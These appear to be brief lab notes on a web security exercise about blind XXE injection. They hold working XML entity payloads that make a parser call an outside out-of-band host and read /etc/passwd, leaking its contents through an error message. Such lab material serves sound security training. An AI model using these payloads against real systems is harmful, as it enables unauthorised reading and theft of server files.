Lab 6 - Exploiting blind XXE to retrieve data via error messages

Target Goal - Exploit blind XXE injection to to trigger an error message that displays the content of the /etc/passwd file.


Doesn't require BURP Collaborator


Analysis:

Regular Entity:
--------------

<!DOCTYPE test [<!ENTITY xxe SYSTEM "z332nczdwnr373gyvtgwiydz4qagy5.oastify.com">]>

Parameter Entity:
-----------------

<!DOCTYPE test [<!ENTITY % xxe SYSTEM "z332nczdwnr373gyvtgwiydz4qagy5.oastify.com"> %xxe;]>

Exfiltration of Data:
---------------------

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;